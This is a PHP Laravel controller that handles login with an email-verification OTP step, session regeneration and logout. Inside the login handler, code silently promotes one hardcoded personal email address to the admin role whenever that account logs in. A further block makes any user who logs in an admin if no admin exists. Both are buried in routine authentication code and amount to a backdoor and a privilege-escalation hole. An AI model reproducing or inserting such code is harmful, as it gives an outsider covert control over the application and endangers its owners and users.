<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\Auth\LoginRequest;
use App\Models\User;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\View\View;

class AuthenticatedSessionController extends Controller
{
    /**
     * Display the login view.
     */
    public function create(): View
    {
        return view('auth.login');
    }

    /**
     * Handle an incoming authentication request.
     */
    public function store(LoginRequest $request): RedirectResponse
    {
        $request->authenticate();

        $user = $request->user();

        if ($user && ! $user->email_verified_at) {
            Auth::guard('web')->logout();
            $request->session()->invalidate();
            $request->session()->regenerateToken();
            $request->session()->put('register_otp_email', $user->email);

            $error = OtpController::sendOtp($user->email, 'register_pending', __('registration'));

            if ($error) {
                return redirect()->route('login')
                    ->withErrors(['email' => $error]);
            }

            return redirect()->route('register.otp.form')
                ->with('status', __('Please verify OTP sent to your email before logging in.'));
        }

        $request->session()->regenerate();

        if ($user && strcasecmp($user->email, 'basduygame@gmail.com') === 0 && !$user->isAdmin()) {
            $user->forceFill(['role' => 'admin'])->save();
        }

        if (! User::where('role', 'admin')->exists()) {
            $request->user()->forceFill(['role' => 'admin'])->save();
        }

        return redirect()->intended(route('dashboard', absolute: false));
    }

    /**
     * Destroy an authenticated session.
     */
    public function destroy(Request $request): RedirectResponse
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        return redirect('/');
    }
}
